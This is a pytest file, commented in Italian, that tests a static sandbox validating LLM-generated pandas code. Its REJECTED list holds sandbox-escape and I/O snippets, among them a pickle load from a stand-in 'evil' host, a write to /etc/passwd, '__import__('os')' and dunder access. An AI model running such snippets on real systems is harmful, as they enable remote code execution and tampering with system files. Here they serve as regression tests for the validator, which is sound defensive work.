"""
Test della sandbox statica dell'executor — il cuore di sicurezza del progetto.

Questi test hanno un doppio valore: dimostrano che il validatore funziona E
fanno da REGRESSION di sicurezza. Ogni nuova regola di blocco dovrebbe aggiungere
qui una riga in `REJECTED`: se un domani una modifica riaprisse l'escape, il test
diventa rosso.
"""
import ast

import pandas as pd
import pytest

from core.executor import (
    _last_assigned_name,
    _parse_and_validate,
    _run_code,
    execute_pandas_code,
)
from core.results import ExecutionFailure, ExecutionSuccess


def _is_rejected(code: str) -> bool:
    """True se la sandbox statica rifiuta il codice (ritorna un fallimento invece dell'AST)."""
    return isinstance(_parse_and_validate(code), ExecutionFailure)


# --- Codice PERICOLOSO: deve essere sempre rifiutato ---------------------------
REJECTED = [
    # import in ogni forma
    "import os",
    "from os import system",
    # esecuzione di stringhe non ispezionabili
    "eval('1+1')",
    "exec('x=1')",
    "df.eval('Sales > 1')",
    "df.query('Sales > 1')",
    # I/O su file/rete (prefissi to_/read_/write_)
    "pd.read_pickle('http://evil/x')",
    "df.to_csv('/etc/passwd')",
    "df.to_html('x.html')",
    "px.bar(df).write_html('x.html')",
    # leak via format-string
    "'{0.__class__}'.format(df)",
    # accesso a dunder / attributi privati
    "df.__class__",
    "df._mgr",
    "df['__class__']",
    # builtin pericolosi
    "open('x')",
    "__import__('os')",
    "getattr(df, 'x')",
    "globals()",
    # traversata dei moduli interni di pandas / Styler che scrive file
    "pd.io.common.get_handle('x', 'w')",
    "df.style",
    # cicli potenzialmente infiniti
    "while True:\n    x = 1",
    # --- costrutti fuori dall'allowlist dei nodi AST ---------------------------
    # Non sono exploit noti: sono superficie che a un'espressione Pandas non serve.
    # Restano fuori per costruzione, non perché qualcuno li abbia elencati.
    "def f():\n    return 1",
    "class C:\n    x = 1",
    "with pd.option_context('display.max_rows', 5):\n    x = 1",
    "try:\n    x = 1\nexcept Exception:\n    x = 2",
    "raise ValueError('x')",
    "assert len(df) > 0",
    "del df['Sales']",
    "global x",
    "async def f():\n    x = 1",
    "(x := df['Sales'].sum())",          # walrus
    "match len(df):\n    case 0:\n        x = 1",
]


@pytest.mark.parametrize("code", REJECTED)
def test_codice_pericoloso_rifiutato(code: str):
    assert _is_rejected(code), f"NON rifiutato (escape!): {code!r}"


# --- Codice LEGITTIMO: deve passare il validatore ------------------------------
ALLOWED = [
    "df['Sales'].sum()",
    "df.groupby('Region', as_index=False)['Sales'].sum()",
    "df['Sales'].mean() * 2",
    "df.describe()",
    "df.sort_values('Sales', ascending=False).head(5)",
    # convertitori 'puri' in memoria: consentiti nonostante il prefisso to_
    "df['Sales'].to_dict()",
    "df['Sales'].to_numpy()",
    "df.to_dict()",
    # assegnazioni multiple + risultato
    "risultato = df['Sales'].sum()",
    # --- idiomi che l'allowlist NON deve rompere -------------------------------
    # Sono le forme che il system prompt insegna al modello a produrre: se una di
    # queste venisse rifiutata, l'app smetterebbe di rispondere a domande legittime.
    "df[df['Sales'] > 100]",                                   # maschera booleana
    "df[(df['Sales'] > 100) & (df['Profit'] > 0)]",             # maschere combinate
    "df[~(df['Sales'] > 100)]",                                 # negazione bitwise
    "df.iloc[:5]",                                              # slice
    "df.loc[:, ['Region', 'Sales']]",                           # slice + lista
    "df['Sales'].apply(lambda v: v * 2)",                       # lambda
    "[c for c in df.columns]",                                  # comprehension
    "risultato = f\"totale {df['Sales'].sum():.1f}\"",           # f-string
    "x = 1 if len(df) else 2",                                  # espressione condizionale
    "tot = 0\nfor i in range(3):\n    tot += i\nrisultato = tot",  # for + augassign
    "if len(df) > 0:\n    risultato = df['Sales'].sum()",        # if
    # l'idioma completo insegnato dalla regola 7 del system prompt
    "dett = df.groupby('Region', as_index=False)['Sales'].sum()\n"
    "dett['percentuale'] = (dett['Sales'] / dett['Sales'].sum() * 100).round(1)\n"
    "risultato = dett\n"
    "fig = to_chart(dett[['Region', 'Sales']], kind='bar')",
]


@pytest.mark.parametrize("code", ALLOWED)
def test_codice_legittimo_accettato(code: str):
    parsed = _parse_and_validate(code)
    assert isinstance(parsed, ast.AST), f"legittimo ma rifiutato: {code!r}"


# --- _last_assigned_name: ordine reale di esecuzione ---------------------------
def test_ultimo_assegnato_semplice():
    tree = ast.parse("a = 1\nb = 2\nc = 3")
    assert _last_assigned_name(tree) == "c"


def test_ultimo_assegnato_dentro_if():
    # 'y' è l'ultima assegnazione in ordine di sorgente, anche se annidata in un if
    code = "x = 1\nif True:\n    y = 2"
    assert _last_assigned_name(ast.parse(code)) == "y"


def test_ultimo_assegnato_augassign():
    code = "x = 1\nx += 5"
    assert _last_assigned_name(ast.parse(code)) == "x"


# --- Causa del rifiuto ---------------------------------------------------------
# La causa è ciò su cui il resto dell'app decide (in particolare se ritentare):
# vale la pena fissarla, non solo il fatto che il codice sia stato rifiutato.
def test_il_rifiuto_di_sicurezza_non_e_ritentabile():
    fail = _parse_and_validate("df.to_csv('x.csv')")
    assert isinstance(fail, ExecutionFailure)
    assert fail.kind == "security"
    # Rigenerare il codice porterebbe allo stesso blocco: ritentare è solo spreco.
    assert fail.retryable is False


def test_errore_di_sintassi_e_ritentabile():
    fail = _parse_and_validate("df['Sales'.sum()")
    assert isinstance(fail, ExecutionFailure)
    assert fail.kind == "syntax"
    assert fail.retryable is True


def test_codice_senza_statement_e_un_fallimento():
    # Il provider irraggiungibile restituisce un commento-sentinella: niente AST
    # eseguibile, quindi un fallimento e non un successo vuoto.
    fail = _parse_and_validate("# Errore di comunicazione con il provider LLM")
    assert isinstance(fail, ExecutionFailure)
    assert fail.kind == "syntax"


# --- Esecuzione end-to-end -----------------------------------------------------
def test_run_code_espressione(sales_df: pd.DataFrame):
    res = _run_code("df['Sales'].sum()", sales_df)
    assert isinstance(res, ExecutionSuccess)
    assert res.value == sales_df["Sales"].sum()


def test_run_code_multistatement_con_risultato(sales_df: pd.DataFrame):
    code = "tot = df['Sales'].sum()\nrisultato = tot * 2"
    res = _run_code(code, sales_df)
    assert isinstance(res, ExecutionSuccess)
    assert res.value == sales_df["Sales"].sum() * 2


def test_run_code_errore_ritorna_fallimento_runtime(sales_df: pd.DataFrame):
    code = "df['ColonnaInesistente'].sum()"
    res = _run_code(code, sales_df)
    assert isinstance(res, ExecutionFailure)
    assert res.kind == "runtime"
    assert res.retryable is True
    assert res.code == code  # il codice fallito viaggia col fallimento, per la correzione


def test_execute_pandas_code_blocca_codice_pericoloso(sales_df: pd.DataFrame):
    # Percorso pubblico completo: il pre-controllo deve bloccare prima di eseguire.
    out = execute_pandas_code("df.to_csv('x.csv')", sales_df)
    assert isinstance(out, ExecutionFailure)
    assert out.kind == "security"
    assert "sicurezza" in out.message.lower()
